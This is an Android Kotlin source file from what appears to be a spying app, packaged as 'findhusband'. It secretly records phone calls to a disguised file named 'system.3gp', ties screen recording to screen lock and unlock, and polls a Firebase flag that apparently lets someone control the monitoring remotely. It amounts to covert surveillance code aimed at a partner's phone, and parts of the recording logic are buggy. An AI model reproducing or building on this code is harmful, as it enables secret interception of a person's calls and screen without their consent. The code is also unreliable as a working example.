package nguyen.findhusband

import android.annotation.TargetApi
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.telephony.TelephonyManager
import android.util.Log
import android.widget.Toast
import kotlinx.android.synthetic.main.activity_main.*
import java.io.File
import java.io.IOException
import android.content.IntentFilter
import android.media.projection.MediaProjectionManager
import android.util.DisplayMetrics
import nguyen.ScreenPreference
import androidx.core.content.ContextCompat.getSystemService
import android.view.WindowManager
import java.text.SimpleDateFormat
import java.util.*
import android.app.Activity
import android.app.Instrumentation
import androidx.core.content.ContextCompat.getSystemService
import androidx.core.content.ContextCompat.getSystemService
import android.content.Context.MEDIA_PROJECTION_SERVICE
import android.graphics.Camera
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.AudioManager
import android.media.CamcorderProfile
import android.media.MediaRecorder.VideoSource.SURFACE
import android.media.projection.MediaProjection
import android.os.*
import android.view.Gravity
import android.view.SurfaceHolder
import android.view.SurfaceView
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat.startActivityForResult
import androidx.core.content.ContextCompat.getSystemService
import androidx.fragment.app.FragmentActivity
import com.google.android.gms.common.ConnectionResult
import com.google.android.gms.common.api.GoogleApiClient
import java.security.AccessController.getContext
import java.text.Format
import android.view.WindowManager.LayoutParams;
import com.google.firebase.database.*
import java.sql.Array


class PhoneStateReceiver : BroadcastReceiver() {


    private val TAG = PhoneStateReceiver::class.java!!.simpleName

    var mContext: Context? = null
    var outputFile = Environment.getExternalStorageDirectory().absolutePath + "/system.3gp"
    private var filePath = ""
    var myAudioRecorder: MediaRecorder? = MediaRecorder()
    var myRef: DatabaseReference?=null
    /**
     * A problem occurred when trying to create the output file
     */
    private val STATUS_FILE_ERROR = 1

    /**
     * A problem occurred when trying to start recording
     */

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    override fun onReceive(context: Context, intent: Intent) {
        try {
            this.mContext = context
            //  mProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            val action = intent.action
            var database = FirebaseDatabase.getInstance()
             myRef  = database.getReference("message")

            if (ScreenPreference.getInstance(context).saveDeviceID == "0") {
                if (Intent.ACTION_SCREEN_ON == action) {

                    Log.d(TAG, "screen is on...")

                } else if (Intent.ACTION_SCREEN_OFF == action) {
                    Log.d(TAG, "screen is off...")

                } else if (Intent.ACTION_USER_PRESENT == action) {

                    Log.d(TAG, "screen is unlock... 1")
                    ScreenPreference.getInstance(context).saveDeviceID = "1"
                    // context.startService(Intent(context, ScreenService::class.java))


                }
            } else {
                if (Intent.ACTION_SCREEN_ON == action) {

                    Log.d(TAG, "screen is on...")


                } else if (Intent.ACTION_SCREEN_OFF == action) {
                    if (ScreenRecordingActivity.instance.mMediaRecorder != null) {

                        ScreenRecordingActivity.instance.mMediaRecorder!!.stop()
                        ScreenRecordingActivity.instance.mMediaRecorder!!.reset()
                    }
                } else if (Intent.ACTION_USER_PRESENT == action) {

                    checkOnOff()


                   /* Log.d(TAG, "screen is unlock...")
                    var inten = Intent(mContext, ScreenRecordingActivity::class.java)
                    inten.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    inten.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    ScreenPreference.getInstance(context).orderID = "true"

                    mContext!!.startActivity(inten)
                    context.startService(Intent(context, ScreenService::class.java))*/

                }
            }


            val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)

            if (state == TelephonyManager.EXTRA_STATE_RINGING) {

                Toast.makeText(context, "Incoming Call State", Toast.LENGTH_SHORT).show()
                //         Toast.makeText(context, "Ringing State Number is -$incomingNumber", Toast.LENGTH_SHORT).show()
//

            }
            if (state == TelephonyManager.EXTRA_STATE_OFFHOOK) {
                myAudioRecorder = MediaRecorder()

                myAudioRecorder?.setAudioSource(MediaRecorder.AudioSource.MIC)
                myAudioRecorder?.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                myAudioRecorder?.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB)
                myAudioRecorder?.setOutputFile(outputFile)
                //nhận cuộc gọi
                Toast.makeText(context, "Call Received State", Toast.LENGTH_SHORT).show()
                try {
                    myAudioRecorder?.prepare()
                    myAudioRecorder?.start()
                } catch (ise: IllegalStateException) {
                    // make something ...
                } catch (ioe: IOException) {
                    // make something
                }

            }
            if (state == TelephonyManager.EXTRA_STATE_IDLE) {
                //kết thúc
                //  val fdelete = File(MainActivity.instance.outputFile)
                // println(MainActivity.instance.outputFile)
                // fdelete.delete()
                Toast.makeText(context, "Call Idle State", Toast.LENGTH_SHORT).show()

                if (null != myAudioRecorder) {

                    try {
                        myAudioRecorder!!.prepare()
                    } catch (e: IllegalStateException) {
                        // TODO Auto-generated catch block
                        e.printStackTrace()
                    } catch (e: IOException) {
                        // TODO Auto-generated catch block
                        e.printStackTrace()
                    }
                    myAudioRecorder!!.stop()
                    myAudioRecorder!!.release()
                    myAudioRecorder = null

                }


            }
        } catch (e: Exception) {
            e.printStackTrace()
        }


    }

    private fun checkOnOff() {
        myRef!!.addValueEventListener(object : ValueEventListener {
            override fun onCancelled(p0: DatabaseError) {

            }

            override fun onDataChange(dataSnapshot: DataSnapshot) {
                val value = dataSnapshot.getValue(String::class.java)
                Log.d(TAG, "Value is: $value")
                if (value!!.contains("true")){

                }
            }
        })

    }

    fun test() {
        Log.d(TAG, "hehhhhhhhhhhhhhhhhhhhhh")
    }

}



